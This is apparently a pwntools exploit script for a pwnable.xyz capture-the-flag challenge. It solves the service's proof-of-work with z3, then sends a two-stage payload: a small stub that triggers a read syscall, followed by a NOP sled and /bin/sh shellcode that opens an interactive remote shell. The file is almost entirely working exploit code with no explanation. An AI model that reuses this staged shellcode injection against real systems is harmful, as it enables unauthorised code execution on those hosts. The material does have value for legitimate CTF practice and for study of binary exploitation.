import z3
from pwn import *

exe = ELF("./challenge", checksec=True)

context.binary = exe

HOST = "svc.pwnable.xyz"
PORT = 30028

gdbscript = """
set follow-fork-mode child
b *main+0x16f
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

read_more = asm("""
add al, al
add rsi, rdx
mov rdx, 0x100
syscall
""")

real_shellcode = b"\x90" * len(read_more) + asm(shellcraft.amd64.linux.sh())

def solve_pow(r):
    r.recvuntil(b"0x")
    sum = int(r.recvline(), 16)

    x = z3.BitVec("x", 32)
    y = z3.BitVec("y", 32)

    s = z3.Solver()
    s.add(x != 0, y != 0)
    s.add(x + y == sum)
    s.add(x * y == 1 << 32)
    
    if s.check() == z3.sat:
        m = s.model()
        x = m.eval(x).as_long()
        y = m.eval(y).as_long()

        r.sendlineafter(b"> ", f"{x} {y}".encode())
    else:
        print("UNSAT")
        exit(1)
        
def main():
    r  = conn()
    solve_pow(r)
    
    r.sendlineafter(b"Input: ", read_more)
    r.sendline(real_shellcode)
    
    r.interactive()
    
if __name__ == "__main__":
    main()
